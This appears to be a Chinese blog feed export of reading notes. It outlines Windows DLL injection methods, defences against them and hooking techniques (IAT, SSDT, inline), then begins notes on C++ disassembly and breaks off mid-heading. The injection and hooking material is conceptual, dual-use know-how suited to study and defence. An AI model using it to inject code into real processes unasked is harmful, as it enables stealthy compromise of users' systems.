title="利用系统机制加载DLL"></a>利用系统机制加载DLL</h4><p>定制一个基础服务模块，将其注册为系统服务模块，从而实现合法加载</p><p><strong>SetWindowHookEx消息钩子注入</strong></p><p><code>SetWindowsHookEx()</code>用于过滤特定类型消息的钩子</p><blockquote><p><a href="https://learn.microsoft.com/zh-cn/windows/win32/api/winuser/nf-winuser-setwindowshookexa">SetWindowsHookExA 函数 (winuser.h) - Win32 apps | Microsoft Learn</a></p></blockquote><p>对于没有消息循环的纯后台程序没法</p><p><strong>AppInit_DLLs注册表注入</strong></p><p>加载user32.dll时，会调用一个<code>LoadAppDLLs()</code>函数，该函数会读取<code>HKEY_LOACL_MACHINE\Software\Mincrosoft\WindowsNT\CurrentVersion\Windows\AppInit_DLLs</code>，如果改注册表下登记的有dll就会主动加载，通常只能注入GUI程序</p><p><strong>输入法注入</strong></p><p>两种实现形式</p><ul><li>外挂式：通常是一个exe文件，只要启动就能在所有进程中使用，但兼容性不好</li><li>输入法接口式IME：是一个符合win输入法规范的dll。当目标进程切换到该输入法时，负责管理输入法的imm32.dll会加载这个IME模块</li></ul><p><strong>SPI网络过滤器注入</strong></p><p>SPI-服务提供者接口，是winsock2的特性，借助实现一个分层服务提供者对现有的传输服务提供者进行扩展，只要安装win就会自行加载</p><p>支持用户提供传输者、名称空间两种类型的服务提供者；支持用户开发基础服务提供者、分层服务提供者LSP两种类型的传输服务提供者</p><p>将LSP模块写好后，把要安装的SPI模块信息写到注册表位置下即可</p><p><strong>ShineEngine注入</strong></p><p>Windows兼容性模式实现引擎（Windows Shim Engine），即右键“属性”页面中的“兼容性”。该引擎通过修复有问题的API（旧版本）调用，来实现兼容，ntdll在初始化进程时会加载兼容性引擎的dll，默认是ShimEng.dll</p><p>自己编写时需要至少8个函数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">VOID WINAPI <span class="title function_">SE_InstallBeforeInit</span><span class="params">(PUNICODE_STRING pusExecuteFileName, PVOID pShimData)</span>;</span><br><span class="line">BOOL WINAPI <span class="title function_">SE_InstallAfterInit</span><span class="params">(PUNICODE STRING pusExecuteFileName,</span></span><br><span class="line"><span class="params">PVOID pShimData)</span>;</span><br><span class="line">VOID WINAPI <span class="title function_">SE_DLLLoaded</span><span class="params">(PLDR_DATA_TABLE_ENTRY pLdrModuleLoaded)</span>;</span><br><span class="line">VOID WINAPI <span class="title function_">SE_DLLUnloaded</span><span class="params">(PLDR_DATA_TABLE_ENTRY pLdrModuleUnload)</span>;</span><br><span class="line">VOID WINAPI <span class="title function_">SE_GetProcAddress</span><span class="params">(PVOID pvUnknown0)</span>;</span><br><span class="line">VOID WINAPI <span class="title function_">SE_ProcessDying</span><span class="params">()</span>;</span><br><span class="line">VOID WINAPI <span class="title function_">SE_LdrEntryRemoved</span><span class="params">(PLDR_DATA_TABLE_ENTRY pLdrEntryRemoved)</span>;</span><br><span class="line">VOID WINAPI <span class="title function_">SE_GetProcAddressLoad</span><span class="params">(PLDR_DATA_TABLE_ENTRY pLdrEntry)</span>;</span><br></pre></td></tr></table></figure><p>先以挂起方式启动进程，然后向PEB的偏移0x1E8（32位）处写入我们自己的引擎.dll的完整路径</p><p><strong>Explorer shell注入</strong></p><p>右键的快捷菜单：扩展模块一般是一个COM dll——》注册为shell扩展——》所有调用shell接口的进程都会加载该dll</p><h4 id="注入防范"><a href="#注入防范" class="headerlink" title="注入防范"></a>注入防范</h4><p><strong>驱动层防范</strong></p><ul><li><code>KeUserModeCallback</code>防全局消息钩子：对InputBuffer参数中的DLL路径进行合法检验</li><li><code>NtMapViewOfSection/LoadImageNotify</code>对模块进行验证：dll加载一般都是<code>LoadLibrary()</code>——》<code>ntdll!LdrLoadDL</code>实现——》调用<code>ntdll!NtMapViewOfSection</code>来将目标dll映射到当前进程中，可以对该系统服务进行SSDT hook</li><li>拦截进程打开、读写、创建远程进程、发送APC等操作：拦截关键API即可，这样除了创建进程时能够获取进程和主线程句柄，其他时候无法获取</li><li>Call Stack检测非法模块：注入进程一般离不开创建线程、申请内存、修改内存的操作。可以对这些敏感服务进行hook，检测用户态调用栈中是否存在非法模块</li></ul><p><strong>应用层防范</strong></p><ul><li>通过hook<code>LoadLibraryEx</code>函数防范全局钩子、输入法注入等</li><li>在DllMain中防御远程线程：通过栈回溯找到CONTEXT对线程起点进行检查</li><li>枚举并查找当前进程中非法模块和可疑内存：利用<code>GetMappedFileName()</code>API可以发现某个位置映射的PE文件</li><li>hook ntdll中的底层函数进行call stack检测</li></ul><h3 id="Hook技术"><a href="#Hook技术" class="headerlink" title="Hook技术"></a>Hook技术</h3><p>一种是修改数据进行hook（通常是引用的函数地址）——修改指针的值；另一类是直接修改函数内的指令进行hook——修改指针指向的内容的值</p><h4 id="Address-Hook"><a href="#Address-Hook" class="headerlink" title="Address Hook"></a>Address Hook</h4><p>通过修改数据进行hook的方法，被修改的数据一般是函数的地址。这类数据在执行过程中必定会成为eip，因此只要把地址替换为我们的函数地址就能获取程序控制权</p><p><strong>各类表中的地址</strong></p><ul><li><p>PE的IAT：作用范围只针对被hook的模块，必须在以静态链接方式调用的才能被hook</p></li><li><p>PE的EAT：EAT存放的是函数地址偏移，使用时需要加上模块基址</p></li><li><p>user32.dll的回调表：其中有个“USER32!apfnDispatch”的回调函数表，其中存放了各种用于GUI的回调函数，通常与内核中的<code>KeUserModeCallback()</code>相结合</p></li><li><p>IDT：系统的中断描述符表，中断发生时系统根据该表来选择处理方式。idtr寄存器存放IDT表基址，idtl存放表内项目数，每项在x86下8B大小，其中的中断处理例程叫ISR</p></li><li><p>SSDT和shadow ssdt：win上应用程序调用API后转入os内核处理，首先就要用到SSDT，表中存放了所有系统调用的地址。Shadow SSDT则是用于处理GUI服务的表<code>KeServiceDesceptorTableShadow</code></p></li><li><p>C++类的虚函数表：虚函数表VFT保存了基类的虚函数地址，当子类重载某个父类函数时，编译器就会用子类中该函数地址替换虚函数表中相应地址</p></li><li><p>COM接口的功能函数表：COM组件在二进制层面的接口统一，同一个COM接口的所有接口函数都放在一个表中（与VFT类似）</p></li></ul><p>特殊寄存器中的地址：windows使用MSR寄存器组中的<code>IA32_SYSENTER_EIP</code>的值作为内核调用的入口，当在ntdll中调用汇编指令<code>sysenter</code>进入内核时，CPU会首先执行到这里</p><h4 id="Inline-Hook"><a href="#Inline-Hook" class="headerlink" title="Inline Hook"></a>Inline Hook</h4><p>即直接修改指令的hook，关键是转移程序执行流程，一般使用<code>jmp</code>、<code>call</code>、<code>retn</code>等转移指令，主要有五种模式</p><ul><li>jmp xxxx（5字节）</li><li>push xxxxx/retn（6字节）：通过压栈返回实现跳转</li><li>mov eax,xxxx/jmp eax（7字节）：先将转移地址放入寄存器，再实现跳转</li><li>call hook（更换指令或输入表）</li><li>HotPatch Hook：一个短跳+长跳</li></ul><p>大致思路如下：</p><blockquote><p>TargetFun：待替换目标函数；DetourFun：用于替代的自定义函数；TrampolineFun：调用原函数的入口</p></blockquote><ol><li>确定hook方式以及需要在TrampolineFun中执行的指令（观察TargetFun开头的几条指令，据此选择机几字节跳转）</li><li>准备TrampolineFun函数，可以将函数原型设置为和TargetFun一样，以便调用</li><li>利用<code>memcpy()</code>或<code>WriteProcessMemory()</code>等函数将指令写入，需要注意地址偏移量</li><li>call back。如果原指令是E8-call则只需要重新计算新偏移后写入即可</li></ol><h4 id="其他hook与hook点位"><a href="#其他hook与hook点位" class="headerlink" title="其他hook与hook点位"></a>其他hook与hook点位</h4><ul><li>基于异常的hook</li></ul><p>在程序中安装自己的SEH处理过程，之后向被hook的位置写入一条会引发异常的指令（比如INT 3），此时引发访问异常，跳转到事先安装的异常处理过程</p><ul><li>不是hook的hook</li></ul><p>PE文件被感染，修改EntryPoint；各类回调机制；分层服务和过滤驱动模型</p><ul><li>hook位置挑选</li></ul><p>执行流：程序在某个调用过程中都执行了过哪些地方的哪些函数</p><p>hook的位置越早，更早更易获取控制权，但拦截范围有限，容易被绕过；位置越靠下，决定权越大，“流量越大”（调用频率高），对系统影响越大</p><p>应用层上：IAT hook和Inline Hook满足，内核中KiFastCallEntry和KeServiceDescriptorTable最合适</p><h4 id="Hook典型过程"><a href="#Hook典型过程" class="headerlink" title="Hook典型过程"></a>Hook典型过程</h4><p>不管是哪种hook都需要一个自定义的函数来代替被hook的函数，其原型、调用约定、返回值都需要与原函数一样</p><p><strong>Address hook</strong></p><p>IAT-Hook</p><ol><li>准备一个与被hook函数原型一致的函数指针使其指向原始函数</li><li><code>LoadLibrary</code>与<code>GetProcAddress</code>获取目标函数地址</li><li><code>ImageDirectoryEntryToData</code>获取待hook模块输入表起始地址</li><li>循环匹配模块名称，获取目标模块对应的地址表</li><li><code>VirtualQuery</code>与<code>VirtualProtect</code>将输入表所在页属性修改为可写</li><li>内存页属性修改成功后写入自己的API地址，之后恢复内存页属性</li></ol><p>虚函数-Hook</p><p>虚函数表在编译以后位于PE的rdata段，已经固定，需要注意</p><ol><li><p>确定被钩函数在类对应虚函数表中的位置及函数原型</p></li><li><p>定义“替换类”和“钩子类”</p></li><li><p>修改“替换类”的虚函数表，替换其成员函数的指针为“目标函数”的地址，之后修改“目标类”的虚函数表，替换其“目标函数”指针为“钩子类”中的钩子函数</p></li></ol><p>SSDT-Hook：和IAT-Hook相似，但是省去了逐项对比，因为可以靠服务索引直接获取</p><p><strong>二次hook</strong></p><p>即待hook的位置已经被hook了，对Address-hook没啥影响，但是对Inline-hook有以下几种处理</p><ul><li>不再对目标函数进行hook，容易导致蓝屏</li><li>直接替换原来的hook指令，用自己的jmp指令覆盖掉上一个hook的jmp指令。或者先恢复再hook</li><li>在目标函数中换位置</li><li>hook上一个hook过程的Detour函数。即我钩的目标函数是钩子函数，形成hook链</li></ul><blockquote><p>hook引擎：detours express、mhook、easyhook</p></blockquote><h4 id="Hook注意事项"><a href="#Hook注意事项" class="headerlink" title="Hook注意事项"></a>Hook注意事项</h4><ul><li>用法：检查参数、检查结果、拦截调用或下发、信息截获、安全防护、增强补丁</li><li>hook操作的多线程安全：待hook的位置处于不稳定状态时要避免影响其他线程（Address-hook不存在该问题，因为修改一个小于机器字长的数据是原子操作）<ul><li>避免所有可能执行到目标位置的操作。应用层将其他线程都suspend</li><li>使用CPU指令<code>lock xchg/cmpxchg</code></li></ul></li><li>Inline-hook指令碎屑，即覆盖的指令可能不完全，执行完后返回到这些不完整的指令，最好用nop进行填充</li><li>保存恢复现场：栈平衡、恢复寄存器值等。注意返回值</li><li>避免重入，即套娃现象，待hook的函数在Detours中也要用到。</li><li>x64下注意指针定义长度、内存对齐、PE格式的变动、调用约定的变化</li></ul>]]></content>
      
      
      <categories>
          
          <category> 读书笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> OS </tag>
            
            <tag> Windows </tag>
            
            <tag> Re </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>《C++反汇编与逆向分析技术解密》读书笔记</title>
      <link href="/2024/03/05/%E6%B7%B1%E5%85%A5cpp/"/>
      <url>/2024/03/05/%E6%B7%B1%E5%85%A5cpp/</url>
      
        <content type="html"><![CDATA[<p>摘要：从汇编角度理解cpp，主要依托于win平台</p><span id="more"></span><h3 id="Cpp基本数据类型"><a href="#Cpp基本数据类型" class="headerlink" title="Cpp基本数据类型"></a>Cpp基本数据类型</h3><h4 id="整数类型"><a href="#整数类型" class="headerlink" title="整数类型"></a>整数类型</h4><ul><li><p>无符号型整数，将其按照二进制转换之后放入内存，在x86下以小端方式存放。小端是字节单位</p></li><li><p>有符号型整数，最高位表示正负，1负0正。</p><ul><li>对于正数，其最高位=0，剩下位按照十进制—》二进制转换之后的状态放入即可。</li><li>对于负数，首先最高位是1，之后将目标数转换为二进制串后，对每一位取反后+1，得到补码，放入即可</li></ul></li></ul><h4 id="浮点数"><a href="#浮点数" class="headerlink" title="浮点数"></a>浮点数</h4><p>float和double的存储方式一样，区别在于占位问题，下面仅说明float的IEEE编码方式</p><ul><li><p>float占4字节，共32位=1bit符号位+8bit指数位+23bit尾数部分</p></li><li><p>将小数转为二进制，向左移动小数点至最高位仍为1处，记移动的位数k</p></li><li><p>1.xxx的小数点后面全部都是尾数部分，指数部分=(binary)(k+127)</p><blockquote><p>这里再加127是为了防止指数为负数的情况</p></blockquote></li></ul><p>double占8字节，共64位=1bit符号位+11bit指数位+52bit尾数部分</p><p>浮点数的操作通过浮点寄存器实现，并非通用寄存器RAX等</p><ul><li>早期栈结构的浮点寄存器，ST(0)——ST(7)一共8个栈空间，每个寄存器占8字节，每次压栈时压到ST(0)之后继续向下，满了之后还压的话则会丢弃ST(7)中的值</li><li>媒体指令MMX使用64位的MM寄存器——》扩展后变为SSE，使用128位的XMM寄存器——》AVX高级向量扩展使用256位的YMM寄存器</li></ul><h4 id="字符和字符串"><a href="#字符和字符串" class="headerlink" title="字符和字符串"></a>字符和字符串</h4><p>编码格式包括ASCII和Unicode两个标准，前者占据1字节，后者占2字节。在windows编程中char=ASCII，wchar_t=Unicode</p><ul><li><p>Unicode中包含ASCII的编码格式，例如：’a’=0x61=0x0061</p></li><li><p>字符表是一系列编码组和，用于解释不同语种</p></li><li>ASCII表示中文采用GB2312-80，其中保存了常用的6000+汉字，两个字节组和在一起可以表示一个汉字，一个字节表示区，另一个表示位，之后查找字符表</li><li>Unicode本身就是2字节，其UCS-2编码格式和上面ASCII采用同一种字符表，其编码范围0x4E00—0x9520是常用汉字。UCS-4编码则是采用两个Unicode编码，即4字节表示一个汉字</li></ul><p>对于字符串，除了存储其起始地址外，对于长度一种是花费额外空间存放，另一种是选取字符串结束符即可。Cpp使用后一种，在ASCII下只有一个’\0’，在Unicode下两个</p><h4 id="布尔"><a href="#布尔" class="headerlink" title="布尔"></a>布尔</h4><p>在Cpp中有bool和boolean，前者是原生数据类型，后者是宏定义出来的</p><p>bool类型占1字节，0假1真，后者则是<code>typedef unsigned char boolean</code>出来的</p><h4 id="地址-amp-指针-amp-引用"><a href="#地址-amp-指针-amp-引用" class="headerlink" title="地址&amp;指针&amp;引用"></a>地址&amp;指针&amp;引用</h4><ul><li><p>地址：就是地址，房门号</p></li><li><p>指针：其中存放的是地址，根据指针类型可以知道该地址存放的是什么数据类型。<code>char* a</code>表示a中存放一个char型数据的地址，<code>char** b=&amp;a</code>表示其中存放一个地址，该地址处存放的是一个<code>char*</code>类型</p><blockquote><p>type *+1，表示在目标地址+sizeof(type)，理解为数组的下一个元素。两同类型指针相减得到其中夹的元素个数，相加木有意义</p></blockquote></li><li><p>引用：<code>int&amp; c</code>，相当于一个指针，<code>c=(int)d</code>，对变量c做的改变都会反映到变量d上。但是区别于指针的解*操作，引用不需要，直接对变量c的操作和直接操作d一样</p></li></ul><h4 id="常量"><a href="#常量" class="headerlink" title="常量"></a>常量</h4><ul><li><p><code>#define true 1</code>定义的常量，在编译的预处理阶段，编译器就会将所有的<code>true</code>替换为1</p></li><li><p><code>const int a = 1</code>，如果在程序执行有直接对a的修改则会报错，而且由于知道a的值，在编译阶段会直接将变量a按照1进行替换。和define的区别是，const修饰的仍然是一个变量，只是不能修改</p><blockquote><p>想要修改也可以<code>int* b=&amp;a</code>，之后对<code>*b=2</code>即可</p></blockquote></li></ul><h3 id="程序入口"><a href="#程序入口" class="headerlink" title="程序入口"></a>程序入口</h3><p>VC++控制台程序下，启动函数为mainCRTStartup，由KERNEL32.dll负责调用，在启动函数中调用main</p><p>mainCRTStartup</p><ol><li><code>__scrt_common_main()</code>，调用<code>__security_init_cookie()</code>初始化缓冲区溢出全局变量</li><li><code>____scrt_common_main_seh()</code>，调用<code>_initterm_e()</code>&amp;<code>_initterm()</code>分别初始化C和Cpp全局数据；</li><li>注册线程局部存储析构函数</li><li>初始化完成调用<code>invoke_main()</code>——》调用main函数传递命令行参数</li><li>main函数返回后，执行析构函数或有关函数指针，并结束程序</li></ol><p>main函数特征：</p><ul><li>三个参数【命令行参数个数、命令行参数、环境变量】，WinMain需要四个参数</li><li>main函数返回后需要exit函数，例如<code>call __cexit</code></li></ul><h3 id="表达式求值过程"><a href="#表达式求值过程" class="headerlink" title="表达式求值过程"></a>表达式求值过程</h3><p>位移=加法&gt;减法&gt;乘法&gt;除法</p><h4 id="加法-amp-减法-amp-乘法-amp-位运算"><a href="#加法-amp-减法-amp-乘法-amp-位运算" class="headerlink" title="加法&amp;减法&amp;乘法&amp;位运算"></a>加法&amp;减法&amp;乘法&amp;位运算</h4><p>常量传播：编译期间已知的值，直接替换对应变量</p><p>常量折叠：<code>1 * 2 + 3 - 4 / 5 % 6</code>此类会在编译期间运算，得出的结果结合常量传播</p><p>复写传播：<code>int a = argc</code>，之后没有对a操作，则会将所有的变量a替换为argc</p><p><strong>减法</strong>：A+A反码=1111B，A+A反码+1=0（进位），由此得：A反码+1=A补码=（-A）</p><p>算术结果溢出：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &gt; <span class="number">0</span>; i++)&#123;</span><br><span class="line">cout &lt;&lt; i &lt;&lt; <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">&#125;<span class="comment">//注意并不是无限循环，这里的i是有符号数，存在溢出，变为0x80000000时为负数</span></span><br></pre></td></tr></table></figure><ul><li>进位：无符号数超过范围，不会破坏数据，进位保存在CF寄存器</li><li>溢出：有符号超出存储范围，参与加法的数值正负相同，而结果不同则判定溢出，此时OF寄存器=1</li></ul><p><strong>自增与自减</strong>：<code>a++与++a</code>，实际上就是代码的先后顺序不同</p><p><strong>乘法</strong>：包括有符号乘法imul与无符号乘法mul，且根据另一个乘数是否是2^n^有不同的处理。一般都会先尝试优化为移位或是加法，最后再使用乘法指令。</p><blockquote><p>ex：<code>k * 15</code>可以直接用指令，也可以<code>k * 16 - k</code>等价于k左移4位后再减k。</p></blockquote><p><strong>位运算</strong>：大多位运算都会导致信息丢失。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">a = b &lt;&lt; <span class="number">2</span>;<span class="comment">//左移运算，最高位左移到CF中，最低位0</span></span><br><span class="line">a = b &gt;&gt; <span class="number">2</span>;<span class="comment">//右移运算，最低位右移到CF中，最高位不变</span></span><br><span class="line">a = b | <span class="number">2</span>;<span class="comment">//位或运算。。。剩下的异非与懒得写了</span></span><br></pre></td></tr></table></figure><p>对于左移运算，无符号和有符号一样，不用考虑符号位，使用<code>shl</code>指令；右移运算，有符号对应<code>sar</code>可以保留符号位，无符号不需要符号位<code>shr</code>指令将最高位补0</p><h4 id="除法-amp-模除"><a href="#除法-amp-模除" class="headerlink" title="除法&amp;模除"></a>除法&amp;模除</h4><p>有符号除法idiv和无符号除法div。在C中有符号和无符号混除结果为无符号的，有符号的最高位被当作数据为对待，作为无符号数参与计算。</p><p>在计算机中除法都是取整，有三种方式：向下取整、向0取整（大多数包括C语言）、向上取整</p><p>若除数是变量则只能使用指令，为常数时才能有优化空间</p><ul><li>除数为无符号 $2^{n}$：被除数是有符号则结果向0取整，被除数为无符号则右移运算shr，相当于向下取整</li><li>无符号的非 $2^{n}$：<ul><li>优化公式 $\frac{x}{c}=x*M&gt;&gt;32&gt;&gt;n$ ，且使用mul无符号乘法。</li><li>或者$ \frac{x}{c} ={[x-(x \times M&gt;&gt;32)&gt;&gt;n1]+(x \times M&gt;&gt;32)}&gt;&gt;n2$</li></ul></li><li>有符号的$2^{n}$：x&gt;0时$\frac{x}{2^{n}}=x&gt;&gt;n$；x&lt;=0时$\frac{x}{2^{n}}=[x+(2^{n}-1)]&gt;&gt;n$</li><li>有符号的非 $2 ^ {n}$：<ul><li>x&gt;=0，$\frac{x}{c}=x<em>M&gt;&gt;32&gt;&gt;n$；当x&lt;0时$\frac{x}{c}=(x</em>M&gt;&gt;32&gt;&gt;n)+1$</li><li>x&gt;=0，$\frac{x}{c}=(x<em>M&gt;&gt;32)+x&gt;&gt;n$；当x&lt;0时$\frac{x}{c}=[(x</em>M&gt;&gt;32)+x&gt;&gt;n]+1$</li></ul></li><li>有符号的 $-2^{n}$：x&gt;=0时$\frac{x}{-2^{n}}=-(x&gt;&gt;n)$；当x<0时$\frac{x}{-2^{n}}=-{[x+(2^{n}-1)]>&gt;n}$</li><li>有符号的负数但非 $-2^{n}$：<ul><li>x&gt;=0，$\frac{x}{c}=x<em>M&gt;&gt;32&gt;&gt;n$；当x&lt;0时$\frac{x}{c}=(x</em>M&gt;&gt;32&gt;&gt;n)+1$</li><li>x&gt;=0，$\frac{x}{c}=(x<em>M&gt;&gt;32)-x&gt;&gt;n$；当x&lt;0时$\frac{x}{c}=[(x</em>M&gt;&gt;32)-x&gt;&gt;n]+1$</li></ul></li></ul><p>取模：</p><ul><li><p>方案1：对$2^{k}$ 取余，余数的值只须取被除数低k位即可，负数则在k位前补1</p></li><li><p>方案2：对$2^{k}$ 的取余正数同上，负数换为公式$x \bmod 2^{k}=(x+(2^{k}-1) and (2^{k}-1))-(2^{k}-1)$</p></li><li><p>方案3：</p><ul><li><p>正数  $x \bmod 2^{k} =x-(x \space and \sim (2^{k}-1))$</p></li><li><p>负数采用 $ x \bmod 2^{k} =x-(x+(2^{k}-1) and \sim (2^{k}-1))$</p></li></ul></li><li><p>方案4：对非 $2^{k}$ 取余，$r=a-q\times b = a-a{\div}b \times b$</p></li></ul><h4 id="关系运算-amp-逻辑运算"><a href="#关系运算-amp-逻辑运算" class="headerlink" title="关系运算&amp;逻辑运算"></a>关系运算&amp;逻辑运算</h4><ul><li>跳转指令，一般都与CMP和TEST匹配出现（括号内的表示相反意思，不做说明）</li></ul><div class="table-container"><table><thead><tr><th>助记符</th><th>说明</th><th>助记符</th><th>说明</th></tr></thead><tbody><tr><td>JZ（JNZ）</td><td>检查ZF==1跳，说明等于0</td><td>JE（JNE）</td><td>检查ZF==1跳，说明相等</td></tr><tr><td>JS（JNS）</td><td>检查SF==1跳，符号为负跳</td><td>JP/JPE（JNP/JPO）</td><td>检查PF==1跳，‘‘1’’个数为偶数则跳</td></tr><tr><td>JO（JNO）</td><td>检查OF==1跳，溢出则跳转</td><td>JB（JNB）</td><td>检查CF==1跳，小于则跳转</td></tr><tr><td>JL（JNL）</td><td>检查SF!=OF跳，小于跳转</td><td>JA（JNA）</td><td>检查<code>CF==0</code>或<code>ZF==0</code>，大于则跳转</td></tr><tr><td>JG（JNG）</td><td>检查<code>SF==OF</code>且<code>ZF==0</code>，大于则跳转</td><td>JC</td><td>进位跳，检查CF==1</td></tr></tbody></table></div><ul><li><p>表达式短路：</p><ul><li><p>与运算，当左边为假时就直接返回假，不执行右边的</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">add</span><span class="params">(<span class="type">int</span> num)</span></span>&#123;</span><br><span class="line">num &amp;&amp; (num += <span class="built_in">add</span>(num - <span class="number">1</span>));</span><br><span class="line"><span class="keyword">return</span> num;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>或运算，当左边为真时，不执行右边的</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">add</span><span class="params">(<span class="type">int</span> num)</span></span>&#123;</span><br><span class="line">(num == <span class="number">0</span>) || (num += <span class="built_in">add</span>(num - <span class="number">1</span>));</span><br><span class="line"><span class="keyword">return</span> num;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul></li><li><p>条件表达式：即三目运算，表达式~1~？表达式~2~：表达式~3~。1为常量时编译器会在编译期间得到答案，不会存在条件表达式</p><ul><li>2和3都为常量。会使用诸如<code>setz</code>、<code>cmov</code>等条件传输指令</li><li>2或3有变量。可能是上述条件传输指令</li><li>2或3有变量表达式。分支预测或是常规判断</li></ul></li></ul><h4 id="编译器常用优化"><a href="#编译器常用优化" class="headerlink" title="编译器常用优化"></a>编译器常用优化</h4><ul><li>常量折叠、常量传播、复写传播，前面有说</li><li>公共表达式：<code>x = i * 2; y = i * 2;</code>等价于<code>x = i * 2; y = x</code></li><li>减少变量：<code>x = i * 2; y = j * 2;</code>则比较xy时，就只会比较ij大小</li><li>剪去不可达分支：俗称剪枝，不满足条件的if-else语句块将不会存在</li><li>强度削弱：加法或移位代替乘法；乘法或移位代替除法</li><li>数学等价变化、代码外提</li></ul><p>分支优化：在流水线下遇到分支结构，就利用分支目标缓冲器预测并读取指令的目标地址。</p><ul><li>记录地址!=实际地址，则流水线被冲洗，多次预测失败则更新目标地址</li><li>记录地址==实际地址，则并行成功</li></ul><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">10</span>; i++)&#123;</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> j = <span class="number">0</span>; j &lt; <span class="number">10000</span>; j++)</span><br><span class="line">a[i][j]++;</span><br><span class="line">&#125;<span class="comment">//每次退出内循环会预测失败一次，共计失败10</span></span><br></pre></td></tr></table></figure><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span>(<span class="type">int</span> j = <span class="number">0</span>; j &lt; <span class="number">10000</span>; j++)&#123;</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">10</span>; i++)</span><br><span class="line">a[i][j]++;</span><br><span class="line">&#125;<span class="comment">//会失败10000次，要多出来许多时间刷新流水线</span></span><br></pre></td></tr></table></figure><p>高速缓存：存放着一部分经常需要访问的数据，CPU会先访问这个，没有之后再去找内存中的页表，之后再更新该缓存中的数据</p><h3 id="流程控制语句"><a href="#流程控制语句" class="headerlink" title="流程控制语句"></a>流程控制语句</h3><h4 id="if-else等"><a href="#if-else等" class="headerlink" title="if-else等"></a>if-else等</h4><ul><li>纯if语句</li></ul><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*cmp等影响标志位的指令</span></span><br><span class="line"><span class="comment">Jxx向下跳转到if语句代码块结束</span></span><br><span class="line"><span class="comment">&#123;</span></span><br><span class="line"><span class="comment">if语句代码块（语句块结束没有JMP）</span></span><br><span class="line"><span class="comment">&#125;</span></span><br><span class="line"><span class="comment">if结束代码块*/</span></span><br></pre></td></tr></table></figure><ul><li>if-else语句</li></ul><p>第一种方案，执行if语句块和else语句块都需要一次跳转，</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*执行影响标志位的指令</span></span><br><span class="line"><span class="comment">Jxx向下跳转到else语句代码块</span></span><br><span class="line"><span class="comment">&#123;</span></span><br><span class="line"><span class="comment">if语句代码块。。。</span></span><br><span class="line"><span class="comment">JMP向 下 跳转到if-else结束块代码</span></span><br><span class="line"><span class="comment">&#125;</span></span><br><span class="line"><span class="comment">&#123;</span></span><br><span class="line"><span class="comment">else语句块代码（结束没有JMP）</span></span><br><span class="line"><span class="comment">&#125;</span></span><br><span class="line"><span class="comment">if-else结束代码块*/</span></span><br></pre></td></tr></table></figure><p>或者可以将if-else代码块位置提前到else语句块之前，下面这种情况执行else语句块的效率相对较低，需要两次跳转，但是if语句块则无需跳转。一般会由编译器判断命中率选择合适方案</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*执行影响标志位的指令</span></span><br><span class="line"><span class="comment">Jxx向下跳转到else语句代码块</span></span><br><span class="line"><span class="comment">&#123;</span></span><br><span class="line"><span class="comment">if语句代码块（结束无JMP）</span></span><br><span class="line"><span class="comment">&#125;</span></span><br><span class="line"><span class="comment">if-else结束代码块</span></span><br><span class="line"><span class="comment">&#123;</span></span><br><span class="line"><span class="comment">else语句块代码</span></span><br><span class="line"><span class="comment">JMP向 上 跳转到if-else结束块代码</span></span><br><span class="line"><span class="comment">&#125;*/</span></span><br></pre></td></tr></table></figure><ul><li>if构成的多分支结构</li></ul><p>每条if语句由<code>cmp/test&amp;jxx</code>构成，而else由<code>jmp</code>跳转到分支结构的最后一个语句块的结束地址，那么else_if同if一样也是由标志位指令和跳转指令构成。</p><ul><li>代码优化方面：去掉不可达语句块；如果if-else语句块结束后没有其他操作，可以直接将return分别提到各个分支语句块内</li></ul><h4 id="switch"><a href="#switch" class="headerlink" 